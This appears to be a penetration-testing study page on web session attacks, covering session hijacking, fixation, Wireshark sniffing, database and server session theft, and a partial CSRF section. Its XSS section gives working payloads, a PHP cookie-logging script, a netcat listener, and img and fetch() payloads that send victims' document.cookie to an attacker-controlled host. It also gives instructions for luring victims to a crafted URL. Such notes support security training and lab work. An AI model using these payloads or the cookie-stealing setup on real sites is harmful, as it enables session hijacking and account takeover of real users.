---
layout: default
title: Session Attacks
permalink: /Web/session_attacks/
---

# Session Attacks
If an attacker obtains a session identifier, this can result in session hijacking, where the attacker can essentially impersonate the victim in the web application.

Active attacks:
- Session Hijacking
- Session Fixation
- XSS (Cross-Site Scripting)
- CSRF (Cross-Site Request Forgery)
- Open Redirects

Other methods to obtain a session identifier:
- Captured through passive traffic/packet sniffing
- Identified in logs/database
- Predicted
- Brute Forced

## Session Hijacking
If we got access to a cookie value, we can open a New Private Window, navigate the the specific website, open the Web Developer Tools (Shift+Ctrl+I in case of Firefox) and replace the cookie value with the one we gained and reload the page.

## Session Fixation
Session Fixation occurs when an attacker can fixate a (valid) session identifier. For this we have to trick the victim into logging into the application using the aforementioned session identifier. If the victim does so, we can proceed to a Session Hijacking attack (since the session identifier is already known).
### Stage 1: Obtain valid session identifier
Authenticating to an application is not always a requirement to get a valid session identifier, and a large number of applications assign valid session identifiers to anyone who browses them. We can aslo try to create an account.
### Stage 2: Fixate a valid session identifier
Session fixation vulnerability:
- The assigned session identifier pre-login remains the same post-login.
- Session identifiers (such as cookies) are being accepted from URL Query Strings or Post Data and propagated to the application.
*Note: If any value or a valid session identifier specified in the token parameter on the URL is propagated to the PHPSESSID cookie's value, we are probably dealing with a session fixation vulnerability.*
*Note: Another way of identifying this is via blindly putting the session identifier name and value in the URL and then refreshing. E.g. Try something like visiting `http://insecure_app.com/login?PHPSESSID=IControlThisValue` and see if the specified vookie value is propageted to the app.*
### Stage 3: Trick the victim into establishing a session using the identifier we have choosen
All the attacker has to do is craft a URL and lure the victim into visiting it. Then we can proceed with session hijacking.

## Obtaining Session Identifiers without User Interaction
### Traffic Sniffing
Requirements:
- The attacker must be positioned on the same local network as the victim
- Unencrypted HTTP traffic

1. Check the name of the cookie using Web Developers Tools and fire up Wireshark with `sudo -E wireshark`. Right click on the correct interface and "Start capture".
2. Apply "http" filter, then navigate to Edig -> Find Packet. Left-click on Packet list and select "Packet bytes". Select "String" on the third drop-down amnu and specify the name of the cookie.
3. Copy the value of the cookie and hijack the victim's session.

### Obtaining Session Identifiers Post-Exploitation (Web Server Access)
During the post-exploitation phase, session identifiers and session data can be retrieved from either a web server's disk or memory. Of course, an attacker who has compromised a web server can do more than obtain session data and session identifiers. That said, an attacker may not want to continue issuing commands that increase the chances of getting caught.
For this you have to find where the session identifiers are stored. E.g. in case on PHP the entry session.save_path in PHP.ini specifies where session data will be stored.

### Obtaining Session Identifiers Post-Exploitation (Database Access)
In cases where you have direct access to a database via, for example, SQL injection or identified credentials, you should always check for any stored user sessions.
```
show databases;
use project;
show tables;
select * from <table_name>;
```
## Cross-Site Scripting (XSS) attack for session cookie leakage
Requirements:
- Session cookies should be carried in all HTTP requests
- Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing)

Try event handlers like `onload` or `onerror` since they fire up automatically and also prove the highest impact on stored XSS cases. If they're blocked, we can try e.g. `onmouseover`.
We can try these payloads in the input fields:
```
"><img src=x onerror=prompt(document.domain)>
```
*Note: We are using document.domain to ensure that JavaScript is being executed on the actual domain and not in a sandboxed environment. JavaScript being executed in a sandboxed environment prevents client-side attacks. Sandbox escapes exist though.*
```
"><img src=x onerror=confirm(1)>
```
```
"><img src=x onerror=alert(1)>
```
Often, the payload code is not going to be called/executed until another application functionality triggers it. Try to find a functionality, where the submitted payloads are retrieved.
If you find XSS check if HTTPOnly is "off" using Web Developer Tools (Storage -> Cookies -> one of the columns).
If we discovered that it is possible to create and share publicly accessible user profiles that store and execute arbitrary XSS payloads upon viewing, then we can create a cookie-logging script and use it to capture a victim’s session cookie by sharing the URL of a public profile that is vulnerable to stored XSS and embeds our cookie-stealing payload.
```
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```
This PHP script can be hosted on a VPS or on our machine. This script waits for anyone to request ?c=+document.cookie, and it will then parse the included cookie.
Run the cookie-logging script:
```
php -S <VPN/TUN Adapter IP>:8000
```
We can save this payload to the appropriate field:
```
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```
*Note: If you're doing testing in the real world, try using something like [XSSHunter (now deprecated)](https://xsshunter.com/#/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/#/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.
A sample HTTPS>HTTPS payload example:
```
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```
Then we have to send a similar link to the victim (the endpoint where the XSS appeared):
```
http://xss.htb.net/profile?email=ela.stienen@example.com
```
Then wait for the click, we receive the cookie and we can hijack the session. :)
## Obtaining session cookies via XSS (with Netcat)
We can use a similar payload:
```
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```
And listen with netcat:
```
nc -lvnp 8000
```
Then send our crafted URL to the victim and wait for him/her to hold his/her mouse over "test" to get the connection. <br>
In this case the cookie is a Base64 value because of the `btoa()` function. Decode and hijack!

*Note: We don't necessarily have to use the window.location() object that causes victims to get redirected. We can use fetch(), which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way. E.g. we can use a similar payload: `script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>`*

## Cross-Site Request Forgery (CSRF or XSRF)

Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated.

A web application is vulnerable to CSRF attacks when:
- All the parameters required for the targeted request can be determined or guessed by the attacker
- The application's session management is solely based on HTTP cookies, which are automatically included in browser requests

To successfully exploit a CSRF vulnerability, we need:
- To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
- The victim to be logged into the application at the time when the malicious cross-site request is issued




